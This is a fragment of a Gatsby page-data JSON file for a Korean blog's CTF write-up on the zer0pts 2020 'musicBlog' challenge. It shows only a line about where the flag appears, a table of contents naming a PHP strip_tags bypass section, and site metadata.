srcset=\"/static/806732ee76eb47722ae809c7b3674d74/e9ff0/11.png 180w,\n/static/806732ee76eb47722ae809c7b3674d74/f21e7/11.png 360w,\n/static/806732ee76eb47722ae809c7b3674d74/37523/11.png 720w,\n/static/806732ee76eb47722ae809c7b3674d74/bf433/11.png 971w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>응답 결과 헤더 라인에 user-agent 속성에서 FLAG 값을 확인할 수 있다.</li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#dockerfile-%EB%B6%84%EC%84%9D\">DockerFile 분석</a></li>\n<li><a href=\"#flag-%EB%AC%B8%EC%9E%90%EC%97%B4-%EC%B0%BE%EA%B8%B0\">flag 문자열 찾기</a></li>\n<li><a href=\"#samplepage\">SamplePage</a></li>\n<li><a href=\"#postphp-%EB%B6%84%EC%84%9D\">post.php 분석</a></li>\n<li><a href=\"#utilphp-%EB%B6%84%EC%84%9D\">util.php 분석</a></li>\n<li><a href=\"#strip_tags-allows--in-tag-name-allowing-whitelist-bypass-in-browsers\">strip_tags allows / in tag name, allowing whitelist bypass in browsers</a></li>\n<li><a href=\"#php-bug-%ED%85%8C%EC%8A%A4%ED%8A%B8\">PHP Bug 테스트</a></li>\n<li><a href=\"#response-event-%ED%99%95%EC%9D%B8\">response Event 확인</a></li>\n</ul>\n</div>","frontmatter":{"date":"August 24, 2020","title":"zer0pts ctf 2020 - musicBlof 취약점 분석","categories":"CTF","author":"Zer0Luck","emoji":"🥓"},"fields":{"slug":"/zer0pts_music_ctf_writeup/"}},"site":{"siteMetadata":{"siteUrl":"https://dnsdudrla97.github.io","comments":{"utterances":{"repo":"dnsdudrla97/dnsdudrla97.github.io"}}}}},"pageContext":{"slug":"/hitcon2017_sakura_ctf_writeup/2020-08-16-HITCON2017-sakura/","nextSlug":"/elf_device_file3/","prevSlug":"/zer0pts_music_ctf_writeup/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}